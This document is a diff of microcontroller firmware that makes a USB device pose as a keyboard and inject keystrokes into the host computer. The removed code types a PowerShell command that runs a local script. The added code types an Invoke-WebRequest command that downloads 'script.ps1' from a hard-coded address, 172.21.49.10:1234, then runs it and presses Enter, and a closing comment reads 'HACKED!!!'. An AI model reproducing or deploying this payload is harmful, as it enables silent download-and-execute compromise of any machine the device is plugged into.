-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x09;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press F
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release F
-              keyboardhid.MODIFIER = 0x00;
-
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press i
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release i
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0F;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press l
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release l
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x08;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release e
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release <SPACE>
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x34;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press '
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release '
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x38;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release /
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x06;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press c
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release c
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x15;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press r
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release r
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press i
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release i
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x34;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press '
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release '
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x33;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ;
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release ;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release <SPACE>
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x31;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x06;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press c
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release c
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x15;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press r
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release r
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press i
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release i
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release <SPACE>
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-              HAL_Delay(50);
-
-
-			keyboardhid.KEYCODE1 = 0x28;
-			USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <Enter>
-			HAL_Delay(50);
-			keyboardhid.KEYCODE1 = 0x00;    //release <Enter>
-			USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-
-
+	  keyboardhid.KEYCODE1 = 0x0C;
+	  keyboardhid.KEYCODE2 = 0x11;
+	  keyboardhid.KEYCODE3 = 0x19;
+	  keyboardhid.KEYCODE4 = 0x12;
+	  keyboardhid.KEYCODE5 = 0x0E;
+	  keyboardhid.KEYCODE6 = 0x08;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press invoke
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x2D;
+	  keyboardhid.KEYCODE2 = 0x1A;
+	  keyboardhid.KEYCODE3 = 0x08;
+	  keyboardhid.KEYCODE4 = 0x05;
+	  keyboardhid.KEYCODE5 = 0x15;
+	  keyboardhid.KEYCODE6 = 0x08;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -webre
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x14;
+	  keyboardhid.KEYCODE2 = 0x18;
+	  keyboardhid.KEYCODE3 = 0x08;
+	  keyboardhid.KEYCODE4 = 0x16;
+	  keyboardhid.KEYCODE5 = 0x17;
+	  keyboardhid.KEYCODE6 = 0x2C;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press quest
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x2D;
+	  keyboardhid.KEYCODE2 = 0x18;
+	  keyboardhid.KEYCODE3 = 0x15;
+	  keyboardhid.KEYCODE4 = 0x0C;
+	  keyboardhid.KEYCODE5 = 0x2C;
+	  keyboardhid.KEYCODE6 = 0x34;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -uri '
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x0B;
+	  keyboardhid.KEYCODE2 = 0x17;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ht
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x17;
+	  keyboardhid.KEYCODE2 = 0x13;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press tp
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.MODIFIER = 0x02;
+	  keyboardhid.KEYCODE1 = 0x33;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
+	  HAL_Delay(20);
+	  keyboardhid.MODIFIER = 0x00;
+	  keyboardhid.KEYCODE1 = 0x00;                            //release :
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x38;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;                            //release /
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x38;
+	  keyboardhid.KEYCODE2 = 0x1E;
+	  keyboardhid.KEYCODE3 = 0x24;
+	  keyboardhid.KEYCODE4 = 0x1F;
+	  keyboardhid.KEYCODE5 = 0x37;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /172.
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x1F;
+	  keyboardhid.KEYCODE2 = 0x1E;
+	  keyboardhid.KEYCODE3 = 0x37;
+	  keyboardhid.KEYCODE4 = 0x21;
+	  keyboardhid.KEYCODE5 = 0x26;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 21.49
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x37;
+	  keyboardhid.KEYCODE2 = 0x1E;
+	  keyboardhid.KEYCODE3 = 0x27;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .10
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.MODIFIER = 0x02;
+	  keyboardhid.KEYCODE1 = 0x33;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
+	  HAL_Delay(20);
+	  keyboardhid.MODIFIER = 0x00;
+	  keyboardhid.KEYCODE1 = 0x00;                            //release :
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x1E;
+	  keyboardhid.KEYCODE2 = 0x1F;
+	  keyboardhid.KEYCODE3 = 0x20;
+	  keyboardhid.KEYCODE4 = 0x21;
+	  keyboardhid.KEYCODE5 = 0x38;
+	  keyboardhid.KEYCODE6 = 0x16;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1234/s
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x06;
+	  keyboardhid.KEYCODE2 = 0x15;
+	  keyboardhid.KEYCODE3 = 0x0C;
+	  keyboardhid.KEYCODE4 = 0x13;
+	  keyboardhid.KEYCODE5 = 0x17;
+	  keyboardhid.KEYCODE6 = 0x37;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press cript.
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.KEYCODE1 = 0x13;
+	  keyboardhid.KEYCODE2 = 0x16;
+	  keyboardhid.KEYCODE3 = 0x1E;
+	  keyboardhid.KEYCODE4 = 0x34;
+	  keyboardhid.KEYCODE5 = 0x2C;
+	  keyboardhid.KEYCODE6 = 0x2D;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ps1' -
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.KEYCODE1 = 0x12;
+	  keyboardhid.KEYCODE2 = 0x18;
+	  keyboardhid.KEYCODE3 = 0x17;
+	  keyboardhid.KEYCODE4 = 0x09;
+	  keyboardhid.KEYCODE5 = 0x0C;
+	  keyboardhid.KEYCODE6 = 0x0F;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press outfil
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.KEYCODE1 = 0x08;
+	  keyboardhid.KEYCODE2 = 0x2C;
+	  keyboardhid.KEYCODE3 = 0x34;
+	  keyboardhid.KEYCODE4 = 0x37;
+	  keyboardhid.KEYCODE5 = 0x38;
+	  keyboardhid.KEYCODE6 = 0x16;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e './s
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.KEYCODE1 = 0x06;
+	  keyboardhid.KEYCODE2 = 0x15;
+	  keyboardhid.KEYCODE3 = 0x0C;
+	  keyboardhid.KEYCODE4 = 0x13;
+	  keyboardhid.KEYCODE5 = 0x17;
+	  keyboardhid.KEYCODE6 = 0x37;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press cript.
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.KEYCODE1 = 0x13;
+	  keyboardhid.KEYCODE2 = 0x16;
+	  keyboardhid.KEYCODE3 = 0x1E;
+	  keyboardhid.KEYCODE4 = 0x34;
+	  keyboardhid.KEYCODE5 = 0x33;
+	  keyboardhid.KEYCODE6 = 0x37;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ps1';
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+	  keyboardhid.KEYCODE1 = 0x31;
+	  keyboardhid.KEYCODE2 = 0x16;
+	  keyboardhid.KEYCODE3 = 0x06;
+	  keyboardhid.KEYCODE4 = 0x15;
+	  keyboardhid.KEYCODE5 = 0x0C;
+	  keyboardhid.KEYCODE6 = 0x13;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /scrip
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
+
+
+	  keyboardhid.KEYCODE1 = 0x17;
+	  keyboardhid.KEYCODE2 = 0x37;
+	  keyboardhid.KEYCODE3 = 0x13;
+	  keyboardhid.KEYCODE4 = 0x16;
+	  keyboardhid.KEYCODE5 = 0x1E;
+	  keyboardhid.KEYCODE6 = 0x28;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t.ps1 <ENTER>
+	  HAL_Delay(20);
+	  keyboardhid.KEYCODE1 = 0x00;
+	  keyboardhid.KEYCODE2 = 0x00;
+	  keyboardhid.KEYCODE3 = 0x00;
+	  keyboardhid.KEYCODE4 = 0x00;
+	  keyboardhid.KEYCODE5 = 0x00;
+	  keyboardhid.KEYCODE6 = 0x00;
+
+	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
+	  HAL_Delay(20);
 
 
       //HACKED!!!
